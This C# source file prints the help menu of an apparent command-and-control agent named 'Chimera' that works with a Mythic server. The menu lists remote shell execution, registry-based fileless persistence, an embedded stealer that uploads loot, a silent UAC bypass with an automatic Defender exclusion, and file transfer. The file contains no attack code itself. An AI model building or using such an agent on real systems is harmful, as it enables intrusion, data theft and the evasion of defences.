using System;
using System.Text;

namespace Chimera.Commands
{
    public static class Help
    {
        public static string Execute()
        {
            var sb = new StringBuilder();
            sb.AppendLine("Chimera Agent — Available Commands");
            sb.AppendLine("===================================");
            sb.AppendLine();
            sb.AppendLine("shell <cmd>              Run a command via cmd /c");
            sb.AppendLine("ls [path]                List directory contents");
            sb.AppendLine("pwd                      Print working directory");
            sb.AppendLine("cd <path>                Change working directory");
            sb.AppendLine("upload <remote> <local>  Upload file from agent to Mythic");
            sb.AppendLine("download <url> <local>   Download file from Mythic to agent");
            sb.AppendLine("sleep <seconds> [jitter] Change beacon interval");
            sb.AppendLine("persist                  Fileless encrypted persistence (HKCU Run + blob)");
            sb.AppendLine("run_stealer              Inject and run the embedded stealer, then uploads loot");
            sb.AppendLine("bypass                   Silent UAC bypass + auto Defender C:\\ exclusion");
            sb.AppendLine("kill                     Terminate agent process");
            sb.AppendLine("help                     Show this help");
            return sb.ToString();
        }
    }
}
